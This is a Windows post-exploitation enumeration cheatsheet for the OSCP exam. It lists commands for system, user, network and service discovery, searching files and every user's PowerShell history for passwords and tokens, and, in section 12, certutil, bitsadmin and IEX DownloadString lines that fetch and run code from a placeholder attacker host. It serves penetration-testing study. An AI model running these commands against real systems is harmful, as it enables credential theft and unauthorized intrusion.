# 🪟 Windows Enumeration Cheatsheet (OSCP Edition)

Clean, fast, exam-ready, minimal noise.

---

# Table of Contents
1. System Information  
2. Users, Groups & Privileges  
3. Network Enumeration  
4. Services, Drivers & Startup  
5. Installed Software & Patch Levels  
6. File System Looting  
7. PowerShell History (All Users)  
8. Scheduled Tasks  
9. Environment Variables & PATH  
10. AD Enumeration (If Domain Joined)  
11. AV / Security Controls  
12. File Transfer (LOLBAS)  
13. OSCP PrivEsc Quick Checklist  

---

# 1. System Information

### CMD
```cmd
systeminfo
hostname
whoami /all
wmic os get Caption,Version,BuildNumber
```

### PowerShell
```powershell
Get-ComputerInfo | Select OsName,OsVersion,OsBuildNumber
$env:COMPUTERNAME
whoami /all
```

### Look For
- OS and build → map to known PrivEsc exploits  
- Domain membership  
- Interesting privileges (SeImpersonate, SeBackup, SeRestore, SeDebug)  

---

# 2. Users, Groups & Privileges

### CMD
```cmd
net users
net user <username>
net localgroup
net localgroup administrators
query user
```

### PowerShell
```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
(Get-WmiObject Win32_LoggedOnUser).Antecedent
```

### Look For
- Local admins  
- Logged-in high-value users  
- Service accounts  
- Privileges usable for PrivEsc  

---

# 3. Network Enumeration

### CMD
```cmd
ipconfig /all
route print
arp -a
netstat -ano
```

### PowerShell
```powershell
Get-NetIPConfiguration
Get-NetNeighbor
Get-NetRoute
Get-NetTCPConnection
```

### Look For
- Additional subnets → pivot  
- DNS servers → domain controllers  
- Listening ports → local privilege escalation, file upload points  

---

# 4. Services, Drivers & Startup

### CMD
```cmd
sc query state= all
sc qc <ServiceName>
driverquery
```

### PowerShell
```powershell
Get-Service
Get-WmiObject Win32_Service | select Name,State,StartMode,PathName
Get-WmiObject Win32_SystemDriver | select Name,State,PathName
```

### Look For
- Unquoted service paths  
- Writable service binaries or dirs  
- Services running as SYSTEM  
- Vulnerable drivers  

---

# 5. Installed Software & Patches

### CMD
```cmd
wmic product get name,version
wmic qfe
```

### PowerShell
```powershell
Get-WmiObject Win32_Product | select Name,Version
Get-HotFix
```

### Look For
- Outdated/vulnerable software  
- Missing patches relevant to OSCP kernel exploits  

---

# 6. File System Looting

### CMD
```cmd
dir C:\Users
dir C:\Users\ /s /b *.txt *.ps1 *.ini *.xml *.config *.kdbx *.rdp
findstr /si "password" C:\*.*
```

### PowerShell
```powershell
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Include *.txt,*.ps1,*.ini,*.config,*.xml,*.kdbx,*.rdp -Recurse
Select-String -Path C:\* -Pattern "password","pass","secret"

Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### Look For
- KeePass databases  
- Config files with creds  
- Web configs  
- Scripts containing passwords  

---

# 7. PowerShell History (ALL USERS)

### 7.1 Locate All Users' History Files

#### CMD
```cmd
dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt" /s /b
```

#### PowerShell
```powershell
Get-History
# Get history

(Get-PSReadlineOption).HistorySavePath
# Display path of the history file from PSReadline

type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Results if Get-History empty

Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
# Contents of the transcript file

Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" -File -Recurse
```

---

### 7.2 Dump All Users’ PowerShell History

#### CMD
```cmd
for /d %u in (C:\Users\*) do (
  type "%u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)
```

#### PowerShell
```powershell
Get-ChildItem C:\Users -Directory | % {
  $hist = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
  if (Test-Path $hist) {
    Write-Host "`n===== History: $($_.Name) ====="
    Get-Content $hist
  }
}
```

---

### 7.3 Search History Files for Passwords/Tokens

#### CMD
```cmd
findstr /si "password pass cred secret token key" "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*.txt"
```

#### PowerShell
```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" -File -Recurse |
  Select-String -Pattern "password","cred","secret","token","key"
```

---

### Look For
- Clear-text passwords  
- Admins running scripts/tools  
- SQL / RDP / WinRM commands with credentials  
- API keys or connection strings  

---

# 8. Scheduled Tasks

### CMD
```cmd
schtasks /query /fo LIST /v
```

### PowerShell
```powershell
Get-ScheduledTask | % { $_; Get-ScheduledTaskInfo $_.TaskName }
```

### Look For
- Tasks running as SYSTEM  
- Executables/scripts in writable directories  
- Custom admin scripts  

---

# 9. Environment Variables & PATH

### CMD
```cmd
set
echo %PATH%
```

### PowerShell
```powershell
Get-ChildItem Env:
$env:PATH
```

### Look For
- Writable directories in PATH → DLL/EXE hijack  
- Variables containing creds or connection strings  

---

# 10. Active Directory Enumeration (If Domain Joined)

### CMD
```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
nltest /dclist:<domain>
```

### PowerShell
```powershell
net user /domain
net group /domain
nltest /domain_trusts
```

### Look For
- Domain admins  
- Other machines with weak security  
- Trust relationships  

---

# 11. AV / Security Controls

### CMD
```cmd
tasklist /v
```

### PowerShell
```powershell
Get-Process
Get-MpComputerStatus  # If available
```

### Look For
- AV/EDR presence  
- Admin tools in use  

---

# 12. File Transfer (LOLBAS)

### certutil (download)
```cmd
certutil -urlcache -f http://<IP>/file.exe file.exe
```

### bitsadmin (download)
```cmd
bitsadmin /transfer dl /download /priority normal http://<IP>/file.exe C:\file.exe
```

### PowerShell Web Download
```powershell
IEX(New-Object Net.WebClient).DownloadString("http://<IP>/script.ps1")
(New-Object Net.WebClient).DownloadFile("http://<IP>/file.exe","C:\file.exe")
```

---

# 13. 🧨 OSCP Windows PrivEsc Quick Checklist

### 🔹 System Info
- [ ] OS version & build  
- [ ] High-value privileges (`SeImpersonate`, etc.)  

### 🔹 Users & Sessions
- [ ] Local admins  
- [ ] Logged-in users  
- [ ] Service accounts  

### 🔹 Network
- [ ] Additional subnets  
- [ ] Internal services  
- [ ] High-port listeners  

### 🔹 Services
- [ ] Unquoted service paths  
- [ ] Writable service binaries  
- [ ] Services running as SYSTEM  

### 🔹 File System Loot
- [ ] PowerShell history (ALL USERS)  
- [ ] Credentials in configs  
- [ ] KeePass files  
- [ ] Web configs  
- [ ] Scripts with passwords  

### 🔹 Scheduled Tasks
- [ ] SYSTEM tasks running writable scripts  

### 🔹 Environment
- [ ] Writable PATH directories  

### 🔹 AD (if applicable)
- [ ] Domain admins  
- [ ] Other machines  
- [ ] Trusts  

### 🔹 Exploits
- [ ] Kernel vulns (if unpatched)  
- [ ] Token impersonation via SeImpersonatePrivilege  
- [ ] Weak service permissions  
- [ ] DLL hijacking  
